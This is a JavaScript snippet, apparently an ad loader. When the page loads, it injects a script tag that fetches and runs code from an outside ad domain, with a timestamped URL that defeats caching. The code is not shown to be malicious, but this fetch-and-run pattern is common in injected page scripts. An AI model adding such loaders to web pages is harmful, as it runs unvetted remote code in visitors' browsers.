function init_kouling(){
  setTimeout(function(a) {
    if (!document.body) {
      console.log(arguments.callee)
     return setTimeout(arguments.callee, 50)
    }
    var b = document.createElement("script");
    b.setAttribute('src','https://ad.tyuss.com/adzone/gkl'+Date.now()+'.js')
    document.body.appendChild(b)
  },50)
}
init_kouling()